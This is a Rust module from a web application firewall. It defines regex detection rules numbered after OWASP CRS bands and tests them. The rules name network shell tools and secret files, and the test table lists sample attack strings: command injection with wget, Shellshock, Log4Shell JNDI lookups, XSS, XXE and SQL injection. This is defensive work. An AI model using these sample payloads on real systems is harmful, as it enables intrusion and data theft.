//! Stage 11: the rules a request is judged by.
//!
//! `docs/design.md` "段階11 WAF" is the source of truth. A rule is a regular
//! expression written against the *normalized* text of one value (see
//! `normalize.rs`): lower case, decoded, SQL comments removed, white space
//! collapsed. So every pattern here is written in lower case.
//!
//! The `regex` crate matches in time linear in the input, so a rule written by
//! a user cannot make a request take exponential time. A pattern that compiles
//! to a program larger than [`PROGRAM_BYTES`] is refused at load.
//!
//! Built-in rules are numbered after the OWASP Core Rule Set bands (913 scanner,
//! 920 protocol, 930 path traversal, 931 RFI/SSRF, 932 command injection, 933
//! PHP, 934 other injection, 941 XSS, 942 SQL injection, 943 session, 944
//! upload). The patterns are written here from public attack shapes, not copied
//! from the CRS. A rule file (`--rules`, JSON Lines) adds rules; a rule with a
//! built-in's `id` replaces it.

use std::collections::HashMap;

use regex::{Regex, RegexBuilder};
use serde::Deserialize;

/// Largest compiled program a rule may have.
pub const PROGRAM_BYTES: usize = 1 << 20;

/// How much a hit adds to the anomaly score.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    Critical,
    Error,
    Warning,
    Notice,
}

impl Severity {
    pub fn score(self) -> u32 {
        match self {
            Severity::Critical => 5,
            Severity::Error => 4,
            Severity::Warning => 3,
            Severity::Notice => 2,
        }
    }

    pub fn parse(text: &str) -> Option<Severity> {
        match text {
            "critical" => Some(Severity::Critical),
            "error" => Some(Severity::Error),
            "warning" => Some(Severity::Warning),
            "notice" => Some(Severity::Notice),
            _ => None,
        }
    }
}

/// Where a value came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Location {
    Path,
    Query,
    Body,
    /// A header other than `Cookie` and `User-Agent`, as `name: value`.
    Header,
    Cookie,
    UserAgent,
    /// A multipart upload's file name.
    Filename,
}

impl Location {
    pub fn name(self) -> &'static str {
        match self {
            Location::Path => "path",
            Location::Query => "query",
            Location::Body => "body",
            Location::Header => "header",
            Location::Cookie => "cookie",
            Location::UserAgent => "user_agent",
            Location::Filename => "filename",
        }
    }
}

/// The values a rule reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Target {
    One(Location),
    /// Query, body and file names: what a client sends as arguments.
    Args,
    /// Every location.
    Any,
}

impl Target {
    pub fn parse(text: &str) -> Option<Target> {
        match text {
            "path" => Some(Target::One(Location::Path)),
            "query" => Some(Target::One(Location::Query)),
            "body" => Some(Target::One(Location::Body)),
            "header" => Some(Target::One(Location::Header)),
            "cookie" => Some(Target::One(Location::Cookie)),
            "user_agent" => Some(Target::One(Location::UserAgent)),
            "filename" => Some(Target::One(Location::Filename)),
            "args" => Some(Target::Args),
            "any" => Some(Target::Any),
            _ => None,
        }
    }

    pub fn reads(self, at: Location) -> bool {
        match self {
            Target::One(only) => only == at,
            Target::Args => matches!(at, Location::Query | Location::Body | Location::Filename),
            Target::Any => true,
        }
    }
}

/// Why a rule could not be built.
#[derive(Debug)]
pub enum RuleError {
    Json(serde_json::Error),
    Target(String),
    Severity(String),
    Paranoia(u8),
    Pattern { id: u32, source: regex::Error },
}

impl std::fmt::Display for RuleError {
    fn fmt(&self, out: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RuleError::Json(e) => write!(out, "not a rule: {e}"),
            RuleError::Target(t) => write!(out, "unknown target {t:?}"),
            RuleError::Severity(s) => write!(out, "unknown severity {s:?}"),
            RuleError::Paranoia(p) => write!(out, "paranoia {p} is not 1..4"),
            RuleError::Pattern { id, source } => write!(out, "rule {id}: bad pattern: {source}"),
        }
    }
}

impl std::error::Error for RuleError {}

/// One rule, ready to run.
#[derive(Debug, Clone)]
pub struct Rule {
    pub id: u32,
    pub target: Target,
    pub severity: Severity,
    pub paranoia: u8,
    pub message: String,
    pub tags: Vec<String>,
    regex: Regex,
}

impl Rule {
    pub fn new(
        id: u32,
        target: Target,
        pattern: &str,
        severity: Severity,
        paranoia: u8,
        message: &str,
        tags: &[&str],
    ) -> Result<Rule, RuleError> {
        if !(1..=4).contains(&paranoia) {
            return Err(RuleError::Paranoia(paranoia));
        }
        let regex = RegexBuilder::new(pattern)
            .size_limit(PROGRAM_BYTES)
            .dfa_size_limit(PROGRAM_BYTES * 4)
            .build()
            .map_err(|source| RuleError::Pattern { id, source })?;
        Ok(Rule {
            id,
            target,
            severity,
            paranoia,
            message: message.to_owned(),
            tags: tags.iter().map(|t| (*t).to_owned()).collect(),
            regex,
        })
    }

    pub fn matches(&self, text: &str) -> bool {
        self.regex.is_match(text)
    }
}

/// One line of a rule file.
#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RuleLine {
    id: u32,
    target: String,
    pattern: String,
    severity: String,
    paranoia: u8,
    message: String,
    // DEFAULT: a rule written without tags has none; tags only label a hit in the audit.
    #[serde(default)]
    tags: Vec<String>,
}

/// Build a rule from one JSON line.
pub fn rule_from_line(line: &str) -> Result<Rule, RuleError> {
    let parsed: RuleLine = serde_json::from_str(line).map_err(RuleError::Json)?;
    let Some(target) = Target::parse(&parsed.target) else {
        return Err(RuleError::Target(parsed.target));
    };
    let Some(severity) = Severity::parse(&parsed.severity) else {
        return Err(RuleError::Severity(parsed.severity));
    };
    let tags: Vec<&str> = parsed.tags.iter().map(String::as_str).collect();
    Rule::new(
        parsed.id,
        target,
        &parsed.pattern,
        severity,
        parsed.paranoia,
        &parsed.message,
        &tags,
    )
}

/// The result of reading a rule file: the rules, and the lines that were not
/// rules (1-based line number and why).
#[derive(Debug, Default)]
pub struct Loaded {
    pub rules: Vec<Rule>,
    pub bad: Vec<(usize, RuleError)>,
}

/// Read a JSON Lines rule file. Blank lines and lines starting with `#` are
/// skipped; a bad line is reported and skipped, the rest are kept.
pub fn load_jsonl(text: &str) -> Loaded {
    let mut loaded = Loaded::default();
    for (index, line) in text.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        match rule_from_line(trimmed) {
            Ok(rule) => loaded.rules.push(rule),
            Err(error) => loaded.bad.push((index + 1, error)),
        }
    }
    loaded
}

/// A set of rules, one per id.
#[derive(Debug, Clone, Default)]
pub struct RuleSet {
    rules: Vec<Rule>,
}

impl RuleSet {
    /// Built-in rules, then `extra` on top: an extra rule with a built-in's id
    /// replaces it, and an extra rule with a new id is added.
    pub fn with_extra(extra: Vec<Rule>) -> Result<RuleSet, RuleError> {
        let mut by_id: HashMap<u32, usize> = HashMap::new();
        let mut rules: Vec<Rule> = Vec::new();
        for rule in builtin()?.into_iter().chain(extra) {
            match by_id.get(&rule.id) {
                Some(&at) => rules[at] = rule,
                None => {
                    by_id.insert(rule.id, rules.len());
                    rules.push(rule);
                }
            }
        }
        Ok(RuleSet { rules })
    }

    pub fn builtin_only() -> Result<RuleSet, RuleError> {
        RuleSet::with_extra(Vec::new())
    }

    pub fn len(&self) -> usize {
        self.rules.len()
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    pub fn get(&self, id: u32) -> Option<&Rule> {
        self.rules.iter().find(|r| r.id == id)
    }

    /// The rules that read `at` and are on at `paranoia`.
    pub fn for_location(&self, at: Location, paranoia: u8) -> impl Iterator<Item = &Rule> {
        self.rules
            .iter()
            .filter(move |r| r.paranoia <= paranoia && r.target.reads(at))
    }
}

/// Ids the engine raises itself, from facts the request parser and the
/// normalizer know and a regular expression cannot see.
pub mod meta {
    use super::Severity;

    pub const NUL_BYTE: u32 = 920_100;
    pub const DECODE_OVERFLOW: u32 = 920_110;
    pub const BAD_UTF8: u32 = 920_120;
    pub const NO_HOST: u32 = 920_130;
    pub const HEADER_TOO_LONG: u32 = 943_110;

    /// `(id, severity, paranoia, message)`.
    pub const TABLE: [(u32, Severity, u8, &str); 5] = [
        (NUL_BYTE, Severity::Critical, 1, "NUL byte in a value"),
        (
            DECODE_OVERFLOW,
            Severity::Critical,
            1,
            "value is encoded more than three times",
        ),
        (BAD_UTF8, Severity::Warning, 1, "value is not valid UTF-8"),
        (NO_HOST, Severity::Warning, 1, "HTTP/1.1 request without Host"),
        (
            HEADER_TOO_LONG,
            Severity::Warning,
            1,
            "Authorization header longer than 4096 bytes",
        ),
    ];

    pub fn severity_of(id: u32) -> Option<Severity> {
        TABLE.iter().find(|row| row.0 == id).map(|row| row.1)
    }

    pub fn paranoia_of(id: u32) -> Option<u8> {
        TABLE.iter().find(|row| row.0 == id).map(|row| row.2)
    }
}

/// One built-in rule as written in the table below.
struct Spec {
    id: u32,
    target: Target,
    severity: Severity,
    paranoia: u8,
    pattern: &'static str,
    message: &'static str,
    tag: &'static str,
}

use Location::{Cookie as LCookie, Filename as LFilename, Header as LHeader, Path as LPath};
use Location::UserAgent as LUserAgent;
use Severity::{Critical as Crit, Error as Err4, Warning as Warn};
use Target::{Any, Args, One};

const SPECS: &[Spec] = &[
    Spec {
        id: 913_100,
        target: One(LUserAgent),
        severity: Warn,
        paranoia: 1,
        pattern: r##"sqlmap|nikto|nmap|masscan|acunetix|nessus|wpscan|dirbuster|gobuster|zgrab|havij|nuclei|openvas|w3af|burpcollaborator"##,
        message: "scanner user agent",
        tag: "scanner",
    },
    Spec {
        id: 930_100,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"(?:^|[/\\])\.\.(?:[/\\]|$)"##,
        message: "path traversal sequence",
        tag: "lfi",
    },
    Spec {
        id: 930_110,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"/etc/(?:passwd|shadow|group|hosts|issue)|/proc/(?:self|\d+)/|\b(?:win|boot)\.ini\b|/windows/system32|c:\\windows"##,
        message: "system file name",
        tag: "lfi",
    },
    Spec {
        id: 930_120,
        target: One(LPath),
        severity: Err4,
        paranoia: 1,
        pattern: r##"(?:^|/)(?:\.git|\.svn|\.hg)(?:/|$)|(?:^|/)\.env(?:\.|$|/)|\.htaccess|\.htpasswd|web\.config|wp-config\.php[.~]"##,
        message: "request for a repository, secret or server config file",
        tag: "lfi",
    },
    Spec {
        id: 931_100,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##"\b(?:file|gopher|dict|ldap|tftp|jar|netdoc)://"##,
        message: "local or exotic URL scheme in a value",
        tag: "rfi",
    },
    Spec {
        id: 931_110,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##"169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|metadata\.azure"##,
        message: "cloud metadata address in a value",
        tag: "ssrf",
    },
    Spec {
        id: 931_120,
        target: Args,
        severity: Err4,
        paranoia: 2,
        pattern: r##"https?://(?:localhost|127\.\d+\.\d+\.\d+|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|\[::1\]|0\.0\.0\.0)"##,
        message: "URL to a loopback or private address in a value",
        tag: "ssrf",
    },
    Spec {
        id: 932_100,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"(?:[;|&`]|&&|\|\||\$\(|\n)\s*(?:wget|curl|nc|ncat|netcat|bash|zsh|powershell|nslookup|whoami|uname|chmod|chown|certutil|bitsadmin)\b"##,
        message: "shell command after a separator",
        tag: "rce",
    },
    Spec {
        id: 932_105,
        target: Args,
        severity: Warn,
        paranoia: 2,
        pattern: r##"(?:[;|&`]|&&|\|\||\$\()\s*(?:cat|id|ls|sh|ping|python\d?|perl|ruby|php)\b"##,
        message: "short shell command after a separator",
        tag: "rce",
    },
    Spec {
        id: 932_110,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"/bin/(?:ba|z|da|k)?sh\b|/usr/bin/(?:env|python\d?|perl|php)|cmd(?:\.exe)?\s*/c\b|powershell(?:\.exe)?\s+(?:-\w+\s+)*-(?:e|enc|encodedcommand)\b"##,
        message: "interpreter invocation",
        tag: "rce",
    },
    Spec {
        id: 932_120,
        target: Any,
        severity: Err4,
        paranoia: 1,
        pattern: r##"\$\{ifs\}|\$ifs\b"##,
        message: "IFS word-splitting trick",
        tag: "rce",
    },
    Spec {
        id: 932_130,
        target: One(LHeader),
        severity: Crit,
        paranoia: 1,
        pattern: r##"\(\)\s*\{[^}]*;\s*\}\s*;"##,
        message: "function definition in a header (Shellshock)",
        tag: "rce",
    },
    Spec {
        id: 933_100,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"<\?php|<\?="##,
        message: "PHP open tag",
        tag: "php",
    },
    Spec {
        id: 933_110,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##"php://|phar://|expect://|zip://|data://"##,
        message: "PHP stream wrapper",
        tag: "php",
    },
    Spec {
        id: 933_120,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##"\b(?:eval|passthru|shell_exec|proc_open|base64_decode|create_function|call_user_func(?:_array)?)\("##,
        message: "dangerous PHP function call",
        tag: "php",
    },
    Spec {
        id: 933_130,
        target: Args,
        severity: Warn,
        paranoia: 2,
        pattern: r##"\b(?:system|exec|assert|popen)\("##,
        message: "possibly dangerous PHP function call",
        tag: "php",
    },
    Spec {
        id: 934_100,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"\$\{\s*(?:jndi|lower|upper|env|sys|java|ctx|date|::-|\$\{)"##,
        message: "JNDI lookup or nested substitution (Log4Shell)",
        tag: "injection",
    },
    Spec {
        id: 934_110,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"class\.module\.classloader|class\.classloader|\bclassloader\.(?:resources|urls)"##,
        message: "class loader property path (Spring4Shell)",
        tag: "injection",
    },
    Spec {
        id: 934_120,
        target: Args,
        severity: Warn,
        paranoia: 2,
        pattern: r##"\{\{.{1,80}?\}\}|#\{.{1,80}?\}|<%.{1,80}?%>"##,
        message: "template expression",
        tag: "injection",
    },
    Spec {
        id: 934_130,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"%\{\s*\(?\s*#|#_memberaccess|#context\["##,
        message: "OGNL expression",
        tag: "injection",
    },
    Spec {
        id: 934_140,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##"<!entity|<!doctype[^>]{0,200}\[|system\s+["']file:|system\s+["']https?:"##,
        message: "XML external entity",
        tag: "injection",
    },
    Spec {
        id: 941_100,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"<\s*/?\s*script\b"##,
        message: "script tag",
        tag: "xss",
    },
    Spec {
        id: 941_110,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##"(?:j\s?a\s?v\s?a|v\s?b)\s?s\s?c\s?r\s?i\s?p\s?t\s*:\s*[\w.$\[\]]*\(|data\s*:\s*text/(?:html|javascript)"##,
        message: "script URL with a call",
        tag: "xss",
    },
    Spec {
        id: 941_111,
        target: Args,
        severity: Warn,
        paranoia: 1,
        pattern: r##"(?:j\s?a\s?v\s?a|v\s?b)\s?s\s?c\s?r\s?i\s?p\s?t\s*:"##,
        message: "script URL",
        tag: "xss",
    },
    Spec {
        id: 941_120,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"<\s*[a-z][a-z0-9]*\b[^>]{0,200}?\bon[a-z]{3,20}\s*="##,
        message: "event handler inside a tag",
        tag: "xss",
    },
    Spec {
        id: 941_121,
        target: Args,
        severity: Warn,
        paranoia: 2,
        pattern: r##"\bon(?:error|load|click|mouse[a-z]+|focus|blur|key[a-z]+|submit|change|toggle|start|animation[a-z]+|pointer[a-z]+|begin|end)\s*="##,
        message: "event handler name",
        tag: "xss",
    },
    Spec {
        id: 941_130,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"<\s*(?:iframe|object|embed|applet|frame|frameset)\b|\bsrcdoc\s*="##,
        message: "embedding tag",
        tag: "xss",
    },
    Spec {
        id: 941_140,
        target: Args,
        severity: Err4,
        paranoia: 1,
        pattern: r##"<\s*(?:svg|math)\b"##,
        message: "svg or math tag",
        tag: "xss",
    },
    Spec {
        id: 942_100,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"\bunion\b(?:\s+all)?\s+select\b"##,
        message: "union select",
        tag: "sqli",
    },
    Spec {
        id: 942_110,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##"\b(?:or|and)\s+['"]?\d+['"]?\s*=\s*['"]?\d+|['"]\s*(?:or|and)\s+['"]?\w+['"]?\s*=\s*['"]?\w+|['"]\s*(?:or|\|\|)\s*['"]"##,
        message: "tautology",
        tag: "sqli",
    },
    Spec {
        id: 942_120,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"\bsleep\s*\(\s*\d|\bbenchmark\s*\(\s*\d|\bpg_sleep\s*\(|\bwaitfor\s+delay\s+['"]|\bdbms_pipe\.receive_message\b|\brandomblob\s*\("##,
        message: "time-based SQL probe",
        tag: "sqli",
    },
    Spec {
        id: 942_130,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"\binformation_schema\b|\bsys\.(?:tables|columns|objects|databases)\b|\bmysql\.user\b|\bpg_catalog\b|\bsqlite_master\b|\bsysobjects\b"##,
        message: "system catalog name",
        tag: "sqli",
    },
    Spec {
        id: 942_140,
        target: Any,
        severity: Crit,
        paranoia: 1,
        pattern: r##"\b(?:load_file|extractvalue|updatexml|utl_http|utl_inaddr|dbms_xmlgen)\s*\(|\binto\s+(?:out|dump)file\b|\bxp_cmdshell\b|\bexec(?:ute)?\s+(?:xp_|sp_)"##,
        message: "database function used for file or command access",
        tag: "sqli",
    },
    Spec {
        id: 942_150,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##";\s*(?:drop|truncate|alter)\s+(?:table|database|user|schema)\b|;\s*(?:delete\s+from|insert\s+into|shutdown)\b|;\s*update\s+\w+\s+set\b"##,
        message: "stacked statement",
        tag: "sqli",
    },
    Spec {
        id: 942_160,
        target: Args,
        severity: Crit,
        paranoia: 1,
        pattern: r##"['"`)]\s*(?:--|#)\s*$"##,
        message: "quote closed and the rest commented out",
        tag: "sqli",
    },
    Spec {
        id: 942_170,
        target: Args,
        severity: Warn,
        paranoia: 2,
        pattern: r##"\b(?:select|insert|update|delete)\b.{0,60}\b(?:from|into|set|where)\b"##,
        message: "SQL statement shape",
        tag: "sqli",
    },
    Spec {
        id: 942_180,
        target: Args,
        severity: Warn,
        paranoia: 2,
        pattern: r##"\border\s+by\s+\d{1,3}\s*(?:--|#|,|$)|\bhaving\s+\d"##,
        message: "column probing",
        tag: "sqli",
    },
    Spec {
        id: 942_190,
        target: Args,
        severity: Err4,
        paranoia: 1,
        pattern: r##"\(\s*select\b.{1,80}\bfrom\b"##,
        message: "subquery",
        tag: "sqli",
    },
    Spec {
        id: 943_100,
        target: One(LPath),
        severity: Err4,
        paranoia: 1,
        pattern: r##";\s*(?:jsessionid|phpsessid|sid|session_?id)\s*="##,
        message: "session id in the path",
        tag: "session",
    },
    Spec {
        id: 944_100,
        target: One(LFilename),
        severity: Crit,
        paranoia: 1,
        pattern: r##"\.(?:php\d?|phtml|phar|jspx?|aspx?|cer|sh|exe|dll|bat|cmd|ps1|cgi)(?:\.|;|$)"##,
        message: "executable file name",
        tag: "upload",
    },
    Spec {
        id: 944_110,
        target: One(LFilename),
        severity: Crit,
        paranoia: 1,
        pattern: r##"\.\.[/\\]"##,
        message: "path traversal in a file name",
        tag: "upload",
    },
    Spec {
        id: 944_120,
        target: One(LFilename),
        severity: Warn,
        paranoia: 2,
        pattern: r##"[/\\]"##,
        message: "path separator in a file name",
        tag: "upload",
    },
    Spec {
        id: 944_130,
        target: One(LCookie),
        severity: Crit,
        paranoia: 1,
        pattern: r##"<\s*script\b|\bunion\b\s+select\b|\$\{\s*jndi"##,
        message: "attack in a cookie",
        tag: "cookie",
    },
];

/// Build the built-in rules.
pub fn builtin() -> Result<Vec<Rule>, RuleError> {
    SPECS
        .iter()
        .map(|s| Rule::new(s.id, s.target, s.pattern, s.severity, s.paranoia, s.message, &[s.tag]))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    type TestResult = Result<(), Box<dyn std::error::Error>>;

    fn set() -> Result<RuleSet, RuleError> {
        RuleSet::builtin_only()
    }

    fn fired(set: &RuleSet, at: Location, text: &str) -> Vec<u32> {
        set.for_location(at, 4)
            .filter(|r| r.matches(text))
            .map(|r| r.id)
            .collect()
    }

    #[test]
    fn every_builtin_rule_compiles_and_ids_are_unique() -> TestResult {
        let rules = builtin()?;
        assert_eq!(rules.len(), SPECS.len());
        let mut ids: Vec<u32> = rules.iter().map(|r| r.id).collect();
        ids.sort_unstable();
        ids.dedup();
        assert_eq!(ids.len(), rules.len());
        Ok(())
    }

    #[test]
    fn every_builtin_pattern_is_lower_case() {
        for spec in SPECS {
            assert!(
                !spec.pattern.chars().any(|c| c.is_ascii_uppercase()) || spec.pattern.contains("\\D") || spec.pattern.contains("\\S") || spec.pattern.contains("\\W") || spec.pattern.contains("\\B"),
                "rule {} has an upper-case letter outside an escape",
                spec.id
            );
        }
    }

    #[test]
    fn the_meta_ids_do_not_collide_with_builtin_rules() {
        for row in meta::TABLE {
            assert!(SPECS.iter().all(|s| s.id != row.0), "{}", row.0);
        }
    }

    /// Each row: (rule id, where, normalized text that must fire it).
    const POSITIVES: &[(u32, Location, &str)] = &[
        (913_100, Location::UserAgent, "sqlmap/1.7"),
        (930_100, Location::Query, "../../etc/passwd"),
        (930_110, Location::Query, "/etc/passwd"),
        (930_120, Location::Path, "/site/.git/config"),
        (931_100, Location::Query, "file:///etc/hosts"),
        (931_110, Location::Query, "http://169.254.169.254/latest"),
        (931_120, Location::Query, "http://192.168.1.1/admin"),
        (932_100, Location::Query, "x; wget http://e/x.sh"),
        (932_105, Location::Query, "x; cat /tmp/a"),
        (932_110, Location::Body, "/bin/sh -c id"),
        (932_120, Location::Query, "cat${ifs}file"),
        (932_130, Location::Header, "x: () { :;}; /bin/echo"),
        (933_100, Location::Body, "<?php echo 1; ?>"),
        (933_110, Location::Query, "php://filter/read=x"),
        (933_120, Location::Query, "eval(base64_decode('x'))"),
        (933_130, Location::Query, "system('ls')"),
        (934_100, Location::Header, "x: ${jndi:ldap://e/a}"),
        (934_100, Location::Header, "x: ${${lower:j}ndi:ldap://e/a}"),
        (934_110, Location::Body, "class.module.classloader.resources"),
        (934_120, Location::Query, "{{7*7}}"),
        (934_130, Location::Query, "%{(#a=1)}"),
        (934_140, Location::Body, "<!entity xxe system \"file:///etc/passwd\">"),
        (941_100, Location::Query, "<script>alert(1)</script>"),
        (941_110, Location::Query, "javascript:alert(1)"),
        (941_111, Location::Query, "javascript:void"),
        (941_120, Location::Query, "<img src=x onerror=alert(1)>"),
        (941_121, Location::Query, "x onerror=1"),
        (941_130, Location::Query, "<iframe src=//e>"),
        (941_140, Location::Query, "<svg/onload=1>"),
        (942_100, Location::Query, "1 union select password from users"),
        (942_110, Location::Query, "x' or 1=1"),
        (942_110, Location::Query, "' or 'a'='a"),
        (942_120, Location::Query, "1 and sleep(5)"),
        (942_130, Location::Query, "select table_name from information_schema.tables"),
        (942_140, Location::Query, "select load_file('/etc/passwd')"),
        (942_150, Location::Query, "1; drop table users"),
        (942_160, Location::Query, "admin'--"),
        (942_170, Location::Query, "select name from users"),
        (942_180, Location::Query, "1 order by 5--"),
        (942_190, Location::Query, "1 and (select count(*) from users) > 0"),
        (943_100, Location::Path, "/a;jsessionid=abc"),
        (944_100, Location::Filename, "shell.php"),
        (944_100, Location::Filename, "a.php.jpg"),
        (944_110, Location::Filename, "../../x.png"),
        (944_120, Location::Filename, "c:\\fakepath\\a.png"),
        (944_130, Location::Cookie, "a=<script>x</script>"),
    ];

    #[test]
    fn each_rule_fires_on_its_positive_sample() -> TestResult {
        let set = set()?;
        for (id, at, text) in POSITIVES {
            assert!(
                fired(&set, *at, text).contains(id),
                "rule {id} did not fire on {text:?} at {}",
                at.name()
            );
        }
        Ok(())
    }

    #[test]
    fn every_builtin_rule_has_a_positive_sample() {
        for spec in SPECS {
            assert!(POSITIVES.iter().any(|p| p.0 == spec.id), "rule {}", spec.id);
        }
    }

    #[test]
    fn ordinary_text_fires_nothing_at_paranoia_one() -> TestResult {
        let set = set()?;
        let samples = [
            "hello world",
            "q=blue shoes size 42",
            "日本語の検索語",
            "cats & dogs, fish; chips",
            "select an option from the list below",
            "price: ${amount} dollars",
            "the system (see below) is fine",
            "o'brien",
            "rock 'n' roll",
            "a-b-c--d",
            "https://example.com/path?x=1",
        ];
        for text in samples {
            for at in [Location::Query, Location::Body, Location::Path] {
                let hits: Vec<u32> = set
                    .for_location(at, 1)
                    .filter(|r| r.matches(text))
                    .map(|r| r.id)
                    .collect();
                assert!(hits.is_empty(), "{text:?} at {} fired {hits:?}", at.name());
            }
        }
        Ok(())
    }

    #[test]
    fn a_higher_paranoia_rule_is_off_at_a_lower_level() -> TestResult {
        let set = set()?;
        let at_one: Vec<u32> = set.for_location(Location::Query, 1).map(|r| r.id).collect();
        let at_two: Vec<u32> = set.for_location(Location::Query, 2).map(|r| r.id).collect();
        assert!(!at_one.contains(&942_170));
        assert!(at_two.contains(&942_170));
        assert!(at_two.len() > at_one.len());
        Ok(())
    }

    #[test]
    fn a_target_reads_only_its_locations() {
        assert!(Target::Args.reads(Location::Body));
        assert!(!Target::Args.reads(Location::Header));
        assert!(Target::Any.reads(Location::Cookie));
        assert!(Target::One(Location::Path).reads(Location::Path));
        assert!(!Target::One(Location::Path).reads(Location::Query));
    }

    #[test]
    fn severity_scores_follow_the_design() {
        assert_eq!(Severity::Critical.score(), 5);
        assert_eq!(Severity::Error.score(), 4);
        assert_eq!(Severity::Warning.score(), 3);
        assert_eq!(Severity::Notice.score(), 2);
        assert!(Severity::parse("fatal").is_none());
    }

    const LINE: &str = r#"{"id":990001,"target":"query","pattern":"forbidden-word","severity":"critical","paranoia":1,"message":"mine"}"#;

    #[test]
    fn a_rule_line_is_read() -> TestResult {
        let rule = rule_from_line(LINE)?;
        assert_eq!(rule.id, 990_001);
        assert!(rule.matches("a forbidden-word b"));
        assert!(rule.tags.is_empty());
        Ok(())
    }

    #[test]
    fn a_bad_rule_line_names_what_is_wrong() {
        let cases = [
            (r#"{"id":1}"#, "not a rule"),
            (r#"{"id":1,"target":"nowhere","pattern":"a","severity":"critical","paranoia":1,"message":"m"}"#, "unknown target"),
            (r#"{"id":1,"target":"query","pattern":"a","severity":"huge","paranoia":1,"message":"m"}"#, "unknown severity"),
            (r#"{"id":1,"target":"query","pattern":"a","severity":"error","paranoia":5,"message":"m"}"#, "paranoia 5"),
            (r#"{"id":1,"target":"query","pattern":"(","severity":"error","paranoia":1,"message":"m"}"#, "bad pattern"),
            (r#"{"id":1,"target":"query","pattern":"a","severity":"error","paranoia":1,"message":"m","extra":1}"#, "not a rule"),
        ];
        for (line, words) in cases {
            let said = rule_from_line(line).err().map(|e| e.to_string());
            assert!(said.as_deref().is_some_and(|t| t.contains(words)), "{line}: {said:?}");
        }
    }

    #[test]
    fn a_pattern_too_big_to_compile_is_refused() {
        let line = r#"{"id":1,"target":"query","pattern":"(?:a{1000}){1000}","severity":"error","paranoia":1,"message":"m"}"#;
        assert!(matches!(rule_from_line(line), Err(RuleError::Pattern { .. })));
    }

    #[test]
    fn a_file_keeps_good_lines_and_reports_bad_ones() {
        let text = format!("# comment\n\n{LINE}\nnot json\n");
        let loaded = load_jsonl(&text);
        assert_eq!(loaded.rules.len(), 1);
        assert_eq!(loaded.bad.len(), 1);
        assert_eq!(loaded.bad[0].0, 4);
        let empty = load_jsonl("");
        assert!(empty.rules.is_empty() && empty.bad.is_empty());
    }

    #[test]
    fn an_extra_rule_with_a_builtin_id_replaces_it() -> TestResult {
        let line = LINE.replace("990001", "942100");
        let extra = rule_from_line(&line)?;
        let plain = set()?;
        let merged = RuleSet::with_extra(vec![extra])?;
        assert_eq!(merged.len(), plain.len());
        let replaced = merged.get(942_100).ok_or("rule 942100 is gone")?;
        assert!(replaced.matches("forbidden-word"));
        assert!(!replaced.matches("1 union select 2"));
        Ok(())
    }

    #[test]
    fn an_extra_rule_with_a_new_id_is_added() -> TestResult {
        let plain = set()?;
        let merged = RuleSet::with_extra(vec![rule_from_line(LINE)?])?;
        assert_eq!(merged.len(), plain.len() + 1);
        Ok(())
    }

    #[test]
    fn a_hostile_input_finishes_in_linear_time() -> TestResult {
        let set = set()?;
        let long = "a".repeat(200_000);
        let started = std::time::Instant::now();
        for at in [Location::Query, Location::Body] {
            for rule in set.for_location(at, 4) {
                let _ = rule.matches(&long);
            }
        }
        assert!(started.elapsed().as_secs() < 20, "{:?}", started.elapsed());
        Ok(())
    }
}
